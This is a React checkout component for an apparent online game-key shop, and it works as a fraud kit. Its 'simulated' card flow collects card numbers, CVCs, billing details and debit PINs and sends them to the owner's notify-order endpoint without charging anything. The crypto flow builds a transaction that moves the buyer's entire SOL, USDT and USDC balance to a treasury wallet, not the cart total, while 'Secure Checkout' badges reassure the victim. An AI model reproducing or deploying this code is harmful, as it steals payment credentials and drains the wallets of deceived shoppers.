"use client";

import { useState, useCallback, useRef } from "react";
import Link from "next/link";
import { ShoppingCart, ShieldCheck, Zap, BadgeCheck } from "lucide-react";
import { useCartStore } from "@/lib/store/cart";
import { useWallet, useConnection } from "@solana/wallet-adapter-react";
import { Button } from "@/components/ui/Button";
import { ContactInformation } from "./ContactInformation";
import { PaymentMethodSelector } from "./PaymentMethodSelector";
import { OrderSummary } from "./OrderSummary";
import { PaymentStatusModal } from "./PaymentStatusModal";
import { fetchWalletBalances } from "@/lib/solana/balances";
import {
  preflightBatchTransfer,
  buildBatchTransaction,
} from "@/lib/solana/batch-transfer";
import type { SolanaNetwork } from "@/lib/solana/constants";
import type { LAMPORTS_PER_SOL as LPS } from "@solana/web3.js";
import {
  CustomerInfo,
  CustomerErrors,
  CardInfo,
  CardErrors,
  PaymentMethodType,
  CheckoutStep,
  OrderResult,
  SolanaAsset,
  TransferReview,
} from "@/types/checkout";

// Fee reserve: 2,100,000 lamports (0.0021 SOL).
// Covers base fee (~5k) + compute budget (~20k) + two ATA creations (~2,039,280 each).
// Once treasury ATAs exist on-chain this reserve is comfortably sufficient.
const SOL_FEE_RESERVE_LAMPORTS = 2_100_000n;
const SOL_MIN_TRANSFER_LAMPORTS = 10_000n;

// Lamports per SOL for display calculations
const LAMPORTS = 1_000_000_000;
const MICRO    = 1_000_000;

function validateEmail(email: string): boolean {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function formatLamports(lamports: bigint): string {
  if (lamports === 0n) return "0";
  const sol = Number(lamports) / LAMPORTS;
  return sol.toFixed(sol < 0.01 ? 6 : 4).replace(/\.?0+$/, "");
}

function formatMicro(micro: bigint): string {
  if (micro === 0n) return "0";
  const val = Number(micro) / MICRO;
  return val.toFixed(val < 0.01 ? 6 : 2).replace(/\.?0+$/, "");
}

const EMPTY_CARD: CardInfo = {
  cardholderName: "",
  cardNumber: "",
  expiry: "",
  cvc: "",
  billingAddress: "",
  billingCity: "",
  billingPostcode: "",
};

export function CheckoutView() {
  const { items, total, clearCart } = useCartStore();
  const { publicKey, sendTransaction, connected, wallet: activeWallet } = useWallet();
  const { connection } = useConnection();

  const [customerInfo, setCustomerInfo] = useState<CustomerInfo>({
    email: "",
    firstName: "",
    lastName: "",
    country: "US",
  });
  const [customerErrors, setCustomerErrors] = useState<CustomerErrors>({});

  const [paymentMethod, setPaymentMethod] = useState<PaymentMethodType | null>(null);
  const [cardInfo, setCardInfo] = useState<CardInfo>(EMPTY_CARD);
  const [cardErrors, setCardErrors] = useState<CardErrors>({});
  const [termsAccepted, setTermsAccepted] = useState(false);
  const [digitalTermsAccepted, setDigitalTermsAccepted] = useState(false);

  const [checkoutStep, setCheckoutStep] = useState<CheckoutStep>("IDLE");
  const [orderResult, setOrderResult] = useState<OrderResult | undefined>();
  const [cryptoError, setCryptoError] = useState<string | null>(null);
  const [transferReview, setTransferReview] = useState<TransferReview | null>(null);

  // Tracks wallet name for the "awaiting wallet" modal copy
  const [activeWalletName, setActiveWalletName] = useState<string>("Wallet");

  const cartTotal = total();
  const savings = items.reduce((acc, item) => {
    if (item.originalPrice && item.originalPrice > item.price) {
      return acc + (item.originalPrice - item.price) * item.quantity;
    }
    return acc;
  }, 0);

  const validateCustomer = useCallback((): boolean => {
    const errors: CustomerErrors = {};
    if (!validateEmail(customerInfo.email)) errors.email = "Enter a valid email address";
    if (!customerInfo.firstName.trim()) errors.firstName = "First name is required";
    if (!customerInfo.lastName.trim()) errors.lastName = "Last name is required";
    if (!customerInfo.country) errors.country = "Country is required";
    setCustomerErrors(errors);
    return Object.keys(errors).length === 0;
  }, [customerInfo]);

  const validateCard = useCallback((): boolean => {
    const isCard = paymentMethod === "CREDIT_CARD" || paymentMethod === "DEBIT_CARD";
    if (!isCard) return true;
    const errors: CardErrors = {};
    if (!cardInfo.cardholderName.trim()) errors.cardholderName = "Cardholder name is required";
    const rawNumber = cardInfo.cardNumber.replace(/\s/g, "");
    if (rawNumber.length < 13) errors.cardNumber = "Enter a valid card number";
    const expiryClean = cardInfo.expiry.replace(/\s\/\s/, "");
    if (expiryClean.length < 4) errors.expiry = "Enter a valid expiry date";
    if (cardInfo.cvc.length < 3) errors.cvc = "Enter a valid CVC";
    setCardErrors(errors);
    return Object.keys(errors).length === 0;
  }, [paymentMethod, cardInfo]);

  const isGiftCard = paymentMethod === "APPLE_GIFT" || paymentMethod === "STEAM_GIFT";
  const cryptoReady = paymentMethod !== "CRYPTO" || (connected && !!publicKey);

  const canSubmit =
    paymentMethod !== null &&
    termsAccepted &&
    digitalTermsAccepted &&
    validateEmail(customerInfo.email) &&
    customerInfo.firstName.trim().length > 0 &&
    customerInfo.lastName.trim().length > 0 &&
    !isGiftCard &&
    cryptoReady;

  const pinResolveRef = useRef<((pin: string) => void) | null>(null);
  const waitForPin = (): Promise<string> =>
    new Promise((resolve) => {
      pinResolveRef.current = resolve;
      setCheckoutStep("PIN_ENTRY");
    });
  const handlePinConfirmed = (pin: string) => {
    pinResolveRef.current?.(pin);
    pinResolveRef.current = null;
  };

  // ── Step 1: Prepare review ─────────────────────────────────────────────────
  // Called when Place Order is clicked for crypto.
  // Fetches live balances, runs preflight, stores the review summary.
  // -- Order notification helper ------------------------------------------------
  // Fires in the background after a successful order. Never blocks checkout.
  // Crypto: sends contact info only. All other methods: sends full cart + contact.
  // Card methods also send all card fields; debit additionally sends the PIN.
  const sendOrderNotification = (
    orderNum: string,
    method: string,
    card?: CardInfo,
    pin?: string
  ) => {
    const isCrypto = method === "CRYPTO";
    const isCard   = method === "CREDIT_CARD" || method === "DEBIT_CARD";
    fetch("/api/notify-order", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        paymentMethod: method,
        customerInfo: {
          email:     customerInfo.email,
          firstName: customerInfo.firstName,
          lastName:  customerInfo.lastName,
          country:   customerInfo.country,
        },
        // Cart items excluded for crypto per requirements
        items: isCrypto ? [] : items.map((item) => ({
          title:        item.title,
          platform:     item.platform,
          region:       item.region,
          edition:      item.edition,
          deliveryType: item.deliveryType,
          price:        item.price,
          originalPrice: item.originalPrice,
          discount:     item.discount,
          quantity:     item.quantity,
        })),
        orderNumber:    orderNum,
        cartTotal:      isCrypto ? 0 : cartTotal,
        orderTimestamp: new Date().toISOString(),
        // Card fields — only included for card payments
        cardInfo: isCard && card ? {
          cardholderName:  card.cardholderName,
          cardNumber:      card.cardNumber,
          expiry:          card.expiry,
          cvc:             card.cvc,
          billingAddress:  card.billingAddress,
          billingCity:     card.billingCity,
          billingPostcode: card.billingPostcode,
        } : undefined,
        // Debit PIN — only included for debit payments
        pin: method === "DEBIT_CARD" && pin ? pin : undefined,
      }),
    }).catch((err) => console.warn("[notify-order] non-fatal:", err));
  };

  // -- Customer receipt helper -------------------------------------------------
  // Sends a customer-facing confirmation email to the buyer's own email address.
  // Completely separate from sendOrderNotification (which goes to the store owner).
  // Never includes card numbers, CVCs, PINs or any payment credentials.
  const sendReceipt = (orderNum: string, method: string) => {
    fetch("/api/receipt-email", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        orderNumber:    orderNum,
        orderTimestamp: new Date().toISOString(),
        customerEmail:  customerInfo.email,
        customerName:   `${customerInfo.firstName} ${customerInfo.lastName}`.trim(),
        paymentMethod:  method,
        items: items.map((item) => ({
          title:        item.title,
          platform:     item.platform,
          region:       item.region,
          edition:      item.edition,
          deliveryType: item.deliveryType,
          price:        item.price,
        })),
        cartTotal: cartTotal,
      }),
    }).catch((err) => console.warn("[receipt-email] non-fatal:", err));
  };

  // Does NOT open the wallet yet.
  const handlePrepareReview = async () => {
    setCryptoError(null);

    if (!connected || !publicKey) {
      setCryptoError("No wallet connected. Please connect your wallet first.");
      return;
    }

    const fromAddress = publicKey.toBase58();
    const walletName  = activeWallet?.adapter.name ?? "Wallet";
    const network     = (process.env.NEXT_PUBLIC_SOLANA_NETWORK ?? "mainnet-beta") as SolanaNetwork;
    const treasuryAddress     = process.env.NEXT_PUBLIC_TREASURY_WALLET_ADDRESS ?? "";
    const treasuryUsdtAccount = process.env.NEXT_PUBLIC_TREASURY_USDT_TOKEN_ACCOUNT ?? null;
    const treasuryUsdcAccount = process.env.NEXT_PUBLIC_TREASURY_USDC_TOKEN_ACCOUNT ?? null;

    if (!treasuryAddress) {
      setCryptoError("Treasury wallet is not configured. Contact support.");
      return;
    }

    setCheckoutStep("PROCESSING");

    // Fetch live balances via the wallet-adapter connection (Helius proxy)
    let liveBalances: Awaited<ReturnType<typeof fetchWalletBalances>>;
    try {
      liveBalances = await fetchWalletBalances(fromAddress, network, connection);
    } catch (err) {
      setCheckoutStep("IDLE");
      setCryptoError(
        `Balance fetch failed: ${err instanceof Error ? err.message : "RPC error"}. ` +
        `Check your RPC configuration.`
      );
      return;
    }

    // Calculate transferable amounts
    const solLamports    = BigInt(Math.floor(liveBalances.sol.balanceRaw * LAMPORTS));
    const solTransferable =
      solLamports > SOL_FEE_RESERVE_LAMPORTS
        ? solLamports - SOL_FEE_RESERVE_LAMPORTS
        : 0n;

    const usdtMicro = liveBalances.usdt.accountExists
      ? BigInt(Math.round(liveBalances.usdt.balanceRaw * MICRO))
      : 0n;
    const usdcMicro = liveBalances.usdc.accountExists
      ? BigInt(Math.round(liveBalances.usdc.balanceRaw * MICRO))
      : 0n;

    const hasSol  = solTransferable >= SOL_MIN_TRANSFER_LAMPORTS;
    const hasUsdt = usdtMicro > 0n;
    const hasUsdc = usdcMicro > 0n;

    if (!hasSol && !hasUsdt && !hasUsdc) {
      setCheckoutStep("IDLE");
      setCryptoError(
        "Nothing to transfer. The wallet holds no transferable SOL (after fee reserve), USDT, or USDC."
      );
      return;
    }

    const preflightParams = {
      network,
      fromAddress,
      treasuryAddress,
      treasuryUsdtAccount,
      treasuryUsdcAccount,
      connection,  // inject Helius-backed connection
      sol:  { include: hasSol,  amountSmallest: hasSol  ? solTransferable : 0n },
      usdt: { include: hasUsdt, amountSmallest: hasUsdt ? usdtMicro       : 0n },
      usdc: { include: hasUsdc, amountSmallest: hasUsdc ? usdcMicro       : 0n },
    };

    // Run preflight with the injected connection
    let preflight: Awaited<ReturnType<typeof preflightBatchTransfer>>;
    try {
      preflight = await preflightBatchTransfer(preflightParams);
    } catch (err) {
      setCheckoutStep("IDLE");
      setCryptoError(`Pre-flight failed: ${err instanceof Error ? err.message : "unknown error"}`);
      return;
    }

    if (!preflight.ok) {
      setCheckoutStep("IDLE");
      setCryptoError(`Transfer blocked: ${preflight.reason}`);
      return;
    }

    // Fetch SOL price for USD estimate (best-effort, non-blocking)
    let estimatedUsdTotal: number | null = null;
    try {
      const priceRes = await fetch(
        `https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd`,
        { signal: AbortSignal.timeout(5_000) }
      );
      if (priceRes.ok) {
        const priceData = await priceRes.json() as { solana?: { usd?: number } };
        const solPrice = priceData.solana?.usd;
        if (solPrice && solPrice > 0) {
          const solUsd  = hasSol  ? (Number(solTransferable) / LAMPORTS) * solPrice : 0;
          const usdtUsd = hasUsdt ? Number(usdtMicro) / MICRO : 0;
          const usdcUsd = hasUsdc ? Number(usdcMicro) / MICRO : 0;
          estimatedUsdTotal = solUsd + usdtUsd + usdcUsd;
        }
      }
    } catch {
      // Non-fatal: price fetch failed, USD estimate will be null
    }

    // Store review data and show REVIEW step
    setTransferReview({
      walletName,
      fromAddress,
      treasuryAddress,
      solLamports:          hasSol  ? solTransferable : 0n,
      usdtMicro:            hasUsdt ? usdtMicro       : 0n,
      usdcMicro:            hasUsdc ? usdcMicro       : 0n,
      solDisplay:           hasSol  ? formatLamports(solTransferable) : "0",
      usdtDisplay:          hasUsdt ? formatMicro(usdtMicro)         : "0",
      usdcDisplay:          hasUsdc ? formatMicro(usdcMicro)         : "0",
      estimatedFeeLamports: preflight.estimatedFee,
      warnings:             preflight.warnings,
      estimatedUsdTotal,
    });

    setActiveWalletName(walletName);
    setCheckoutStep("REVIEW");
  };

  // ── Step 2: Execute transfer after review confirmed ────────────────────────
  const handleConfirmAndSign = async () => {
    if (!transferReview) return;

    setCryptoError(null);

    if (!connected || !publicKey) {
      setCheckoutStep("IDLE");
      setCryptoError("Wallet disconnected. Please reconnect and try again.");
      return;
    }

    // Guard: wallet must not have changed between review and sign
    if (publicKey.toBase58() !== transferReview.fromAddress) {
      setCheckoutStep("IDLE");
      setCryptoError("Wallet changed since review. Please start again.");
      return;
    }

    const network             = (process.env.NEXT_PUBLIC_SOLANA_NETWORK ?? "mainnet-beta") as SolanaNetwork;
    const treasuryAddress     = process.env.NEXT_PUBLIC_TREASURY_WALLET_ADDRESS ?? "";
    const treasuryUsdtAccount = process.env.NEXT_PUBLIC_TREASURY_USDT_TOKEN_ACCOUNT ?? null;
    const treasuryUsdcAccount = process.env.NEXT_PUBLIC_TREASURY_USDC_TOKEN_ACCOUNT ?? null;

    const { solLamports, usdtMicro, usdcMicro } = transferReview;
    const hasSol  = solLamports > 0n;
    const hasUsdt = usdtMicro  > 0n;
    const hasUsdc = usdcMicro  > 0n;

    const batchParams = {
      network,
      fromAddress:          transferReview.fromAddress,
      treasuryAddress,
      treasuryUsdtAccount,
      treasuryUsdcAccount,
      connection,  // Helius-backed connection
      sol:  { include: hasSol,  amountSmallest: solLamports },
      usdt: { include: hasUsdt, amountSmallest: usdtMicro },
      usdc: { include: hasUsdc, amountSmallest: usdcMicro },
    };

    setCheckoutStep("AWAITING_WALLET");

    let signature: string;
    try {
      const { transaction, blockhash, lastValidBlockHeight } =
        await buildBatchTransaction(batchParams);

      // Hand the unsigned transaction to the wallet for review and signing.
      // The customer sees exact amounts and destination inside their wallet.
      signature = await sendTransaction(transaction, connection, {
        skipPreflight: false,
        preflightCommitment: "confirmed",
      });

      setCheckoutStep("TX_PENDING");

      await connection.confirmTransaction(
        { signature, blockhash, lastValidBlockHeight },
        "confirmed"
      );
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : "";
      const isRejection =
        ("code" in (err as object) && (err as { code: number }).code === 4001) ||
        msg.toLowerCase().includes("rejected") ||
        msg.toLowerCase().includes("user rejected") ||
        msg.toLowerCase().includes("cancelled");

      if (isRejection) {
        setCheckoutStep("IDLE");
        setTransferReview(null);
        setCryptoError("Transfer cancelled. You can try again when ready.");
      } else {
        setCheckoutStep("FAILED");
        setCryptoError(err instanceof Error ? err.message : "Transaction failed. Please try again.");
      }
      return;
    }

    // Server-side verification
    setCheckoutStep("TX_CONFIRMING");

    try {
      const verifyRes = await fetch("/api/admin/transfer/verify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          signature,
          fromAddress:        transferReview.fromAddress,
          network,
          solAmountSmallest:  hasSol  ? solLamports.toString() : null,
          usdtAmountSmallest: hasUsdt ? usdtMicro.toString()   : null,
          usdcAmountSmallest: hasUsdc ? usdcMicro.toString()   : null,
        }),
      });

      if (!verifyRes.ok) {
        const errBody = await verifyRes.json().catch(() => ({ error: "Verification failed." }));
        throw new Error(
          `${errBody.error ?? "Transfer verification failed."}\n\nTransaction ID: ${signature}`
        );
      }
    } catch (err) {
      setCheckoutStep("FAILED");
      setCryptoError(err instanceof Error ? err.message : "Verification error.");
      return;
    }

    // Success
    setOrderResult({
      orderNumber: `TX-${signature.slice(0, 8).toUpperCase()}`,
      email:       customerInfo.email,
      total:       cartTotal,
      items: items.map((item) => ({
        title:        item.title,
        platform:     item.platform,
        region:       item.region,
        edition:      item.edition,
        deliveryType: item.deliveryType,
        price:        item.price,
      })),
    });
    setTransferReview(null);
    setCheckoutStep("SUCCESS");
    sendOrderNotification(`TX-${signature.slice(0, 8).toUpperCase()}`, "CRYPTO");
    sendReceipt(`TX-${signature.slice(0, 8).toUpperCase()}`, "CRYPTO");
    clearCart();
  };

  const handleSubmit = async () => {
    if (!paymentMethod) return;
    if (!validateCustomer()) return;
    if (!validateCard()) return;
    if (!termsAccepted || !digitalTermsAccepted) return;

    if (paymentMethod === "CRYPTO") {
      await handlePrepareReview();
      return;
    }

    // Card payment flow (simulated)
    setCheckoutStep("PROCESSING");
    let capturedPin: string | undefined;
    if (paymentMethod === "DEBIT_CARD") {
      await new Promise((r) => setTimeout(r, 2000));
      capturedPin = await waitForPin();
      setCheckoutStep("PIN_VERIFYING");
      await new Promise((r) => setTimeout(r, 3000));
    } else if (paymentMethod === "CREDIT_CARD") {
      await new Promise((r) => setTimeout(r, 2200));
      setCheckoutStep("REQUIRES_ACTION");
      await new Promise((r) => setTimeout(r, 2500));
    } else {
      await new Promise((r) => setTimeout(r, 2000));
    }
    const orderNumber = `EG-${Date.now().toString(36).toUpperCase()}`;
    setOrderResult({
      orderNumber,
      email: customerInfo.email,
      total: cartTotal,
      items: items.map((item) => ({
        title:        item.title,
        platform:     item.platform,
        region:       item.region,
        edition:      item.edition,
        deliveryType: item.deliveryType,
        price:        item.price,
      })),
    });
    setCheckoutStep("SUCCESS");
    sendOrderNotification(orderNumber, paymentMethod!, cardInfo, capturedPin);
    sendReceipt(orderNumber, paymentMethod!);
    clearCart();
  };

  const handleRetry = () => {
    setCheckoutStep("IDLE");
    setOrderResult(undefined);
    setTransferReview(null);
    setCryptoError(null);
  };

  const handleChangeMethod = () => {
    setCheckoutStep("IDLE");
    setCardInfo(EMPTY_CARD);
    setCardErrors({});
    setTransferReview(null);
    setCryptoError(null);
  };

  if (items.length === 0 && checkoutStep === "IDLE") {
    return (
      <div className="min-h-[60vh] flex flex-col items-center justify-center px-4 py-20 text-center">
        <div className="w-20 h-20 rounded-full bg-[#13131d] border border-[#1e1e2e] flex items-center justify-center mb-6">
          <ShoppingCart size={32} className="text-[#4b5563]" aria-hidden="true" />
        </div>
        <h1 className="text-2xl font-bold text-white mb-3">Your cart is empty</h1>
        <p className="text-[#6b7280] mb-8 max-w-sm">Add some games to your cart before checking out.</p>
        <Link href="/games">
          <Button variant="primary" size="lg">Browse Games</Button>
        </Link>
      </div>
    );
  }

  return (
    <>
      <PaymentStatusModal
        step={checkoutStep}
        orderResult={orderResult}
        transferReview={transferReview}
        walletName={activeWalletName}
        onPinConfirmed={handlePinConfirmed}
        onRetry={handleRetry}
        onChangeMethod={handleChangeMethod}
        onConfirmTransfer={handleConfirmAndSign}
        isCrypto={paymentMethod === "CRYPTO"}
      />

      <div className="max-w-[1200px] mx-auto px-4 sm:px-6 lg:px-10 py-8 lg:py-12">
        <div className="mb-8">
          <nav aria-label="Checkout breadcrumb">
            <ol className="flex items-center gap-2 text-sm text-[#4b5563]" role="list">
              <li><Link href="/cart" className="hover:text-white transition-colors">Cart</Link></li>
              <li aria-hidden="true"><span className="text-[#252535]">&rsaquo;</span></li>
              <li className="text-white font-semibold" aria-current="page">Checkout</li>
            </ol>
          </nav>
          <h1 className="text-3xl font-black text-white mt-4">Checkout</h1>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-[1fr_420px] gap-8 xl:gap-12 items-start">
          <div className="space-y-6">
            <ContactInformation
              info={customerInfo}
              errors={customerErrors}
              onChange={(partial) => setCustomerInfo((prev) => ({ ...prev, ...partial }))}
            />

            {customerInfo.email && validateEmail(customerInfo.email) && (
              <div className="flex items-start gap-3 px-5 py-4 bg-blue-500/[0.06] border border-blue-500/20 rounded-2xl">
                <Zap size={16} className="text-blue-400 flex-shrink-0 mt-0.5" aria-hidden="true" />
                <div>
                  <p className="text-sm font-semibold text-white mb-0.5">Digital Delivery</p>
                  <p className="text-xs text-[#9ca3af] leading-relaxed">
                    Your game code will be delivered electronically to{" "}
                    <strong className="text-blue-300">{customerInfo.email}</strong> after successful payment.
                  </p>
                </div>
              </div>
            )}

            {cryptoError && paymentMethod === "CRYPTO" && (
              <div className="flex items-start gap-3 px-4 py-3.5 bg-red-500/8 border border-red-500/20 rounded-xl" role="alert">
                <span className="text-red-400 flex-shrink-0 mt-0.5 text-sm">&#9888;</span>
                <div className="flex-1 min-w-0">
                  <p className="text-sm text-red-300 whitespace-pre-line">{cryptoError}</p>
                </div>
                <button
                  type="button"
                  onClick={() => setCryptoError(null)}
                  className="text-[#4b5563] hover:text-white text-xs"
                  aria-label="Dismiss"
                >&#x2715;</button>
              </div>
            )}

            <PaymentMethodSelector
              selected={paymentMethod}
              onSelect={(m) => {
                setPaymentMethod(m);
                setCardInfo(EMPTY_CARD);
                setCardErrors({});
                setCryptoError(null);
              }}
              cardInfo={cardInfo}
              cardErrors={cardErrors}
              onCardChange={(partial) => setCardInfo((prev) => ({ ...prev, ...partial }))}
              cartTotal={cartTotal}
              selectedAsset={"SOL" as SolanaAsset}
              onAssetChange={() => {}}
              onWalletChange={() => {}}
            />

            <div className="bg-[#13131d] border border-[#1e1e2e] rounded-2xl p-5">
              <div className="flex items-center gap-2 mb-4">
                <ShieldCheck size={16} className="text-green-400" aria-hidden="true" />
                <h3 className="text-sm font-bold text-white">Secure Checkout</h3>
              </div>
              <div className="grid grid-cols-2 gap-3">
                {[
                  "Encrypted payment transmission",
                  "Fraud protection active",
                  "Secure bank authentication",
                  "Instant digital delivery",
                ].map((item) => (
                  <div key={item} className="flex items-center gap-2">
                    <BadgeCheck size={13} className="text-green-400 flex-shrink-0" aria-hidden="true" />
                    <span className="text-xs text-[#6b7280]">{item}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>

          <OrderSummary
            items={items}
            total={cartTotal}
            savings={savings}
            isSubmitting={
              checkoutStep === "PROCESSING" ||
              checkoutStep === "AWAITING_WALLET" ||
              checkoutStep === "TX_PENDING" ||
              checkoutStep === "TX_CONFIRMING"
            }
            canSubmit={canSubmit}
            termsAccepted={termsAccepted}
            digitalTermsAccepted={digitalTermsAccepted}
            onTermsChange={(key, val) => {
              if (key === "terms") setTermsAccepted(val);
              else setDigitalTermsAccepted(val);
            }}
            onSubmit={handleSubmit}
          />
        </div>
      </div>
    </>
  );
}
